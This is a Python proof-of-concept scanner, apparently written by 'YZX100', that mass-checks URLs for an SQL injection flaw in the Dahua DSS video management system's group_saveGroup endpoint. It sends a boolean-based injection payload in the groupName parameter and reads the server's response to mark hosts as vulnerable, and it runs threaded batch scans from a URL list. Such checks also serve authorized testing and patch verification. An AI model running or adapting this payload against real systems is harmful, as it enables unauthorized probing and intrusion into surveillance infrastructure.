import requests
import argparse
import threading
import sys


def DSS(url,result):
    create_url = url+"/emap/group_saveGroup?groupName=1%27+AND+2103%3D2103+AND+%27xvPq%27%3D%27xvPq"
    # 请求URL中存在SQL注入语句

    headers = {"User-Agent":"Mozilla/5.0 (Windows NT 5.1;rv:5.0) Gecko/20100101 Firefox/5.0 info",
             "Cache-Control":"max-age=0",
             "Accept-Encoding":"identity",
             "Accept-Language":"zh-CN,zh;q=0.8",
                "Accept-Charset":"GBK,utf-8;q=0.7,*;q=0.3",
               "Connection":"keep-alive"}

    try:
        req = requests.get(create_url,headers=headers,timeout=5)
        # print(req.text)
        # 测试响应包中返回的数据
        if(req.status_code==200):
            if '''{"code":2,"data":null,"message":"预案名称已存在！"}''' in req.text:
                print(f"【+】{url}存在相关SQL注入漏洞")
                result.append(url)
            else:
                print(f"【-】{url}不存在相关SQL注入漏洞")
    except:
        print(f"【-】{url}无法访问或网络连接错误")

def DSS_counts(filename):
    result = []
    try:
        with open(filename,"r") as file:
            urls = file.readlines()
            threads = []
            for url in urls:
                url = url.strip()
                thread = threading.Thread(target=DSS,args=(url,result))
                threads.append(thread)
                thread.start()
            for thread in threads:
                thread.join()

        if result:
            print("\n存在SQL注入漏洞的URL如下：")
            for vulnerable_url in result:
                print(vulnerable_url)
        else:
            print("\n未发现任何存在SQL注入漏洞的URL。")
    except Exception as e:
        print(f"发生错误: {str(e)}")

def start():
    logo='''
              _____                    _____                    _____          
         /\    \                  /\    \                  /\    \         
        /::\    \                /::\    \                /::\    \        
       /::::\    \              /::::\    \              /::::\    \       
      /::::::\    \            /::::::\    \            /::::::\    \      
     /:::/\:::\    \          /:::/\:::\    \          /:::/\:::\    \     
    /:::/  \:::\    \        /:::/__\:::\    \        /:::/__\:::\    \    
   /:::/    \:::\    \       \:::\   \:::\    \       \:::\   \:::\    \   
  /:::/    / \:::\    \    ___\:::\   \:::\    \    ___\:::\   \:::\    \  
 /:::/    /   \:::\ ___\  /\   \:::\   \:::\    \  /\   \:::\   \:::\    \ 
/:::/____/     \:::|    |/::\   \:::\   \:::\____\/::\   \:::\   \:::\____\
\:::\    \     /:::|____|\:::\   \:::\   \::/    /\:::\   \:::\   \::/    /
 \:::\    \   /:::/    /  \:::\   \:::\   \/____/  \:::\   \:::\   \/____/ 
  \:::\    \ /:::/    /    \:::\   \:::\    \       \:::\   \:::\    \     
   \:::\    /:::/    /      \:::\   \:::\____\       \:::\   \:::\____\    
    \:::\  /:::/    /        \:::\  /:::/    /        \:::\  /:::/    /    
     \:::\/:::/    /          \:::\/:::/    /          \:::\/:::/    /     
      \::::::/    /            \::::::/    /            \::::::/    /      
       \::::/    /              \::::/    /              \::::/    /       
        \::/____/                \::/    /                \::/    /        
         ~~                       \/____/                  \/____/         
                                                                           
                                                                           
'''
    print(logo)
    print("脚本由 YZX100 编写")

def main():
    parser = argparse.ArgumentParser(description="大华DSS 视频管理系统group_saveGroup存在SQL注入漏洞")
    parser.add_argument('-u',type=str,help='检测单个url')
    parser.add_argument('-f', type=str, help='批量检测url列表文件')
    args = parser.parse_args()
    if args.u:
        result = []
        DSS(args.u, result)
        if result:
            print("\n存在SQL注入漏洞的URL如下：")
            for vulnerable_url in result:
                print(vulnerable_url)
    elif args.f:
        DSS_counts(args.f)
    else:
        parser.print_help()


if __name__ == "__main__":
    start()
    main()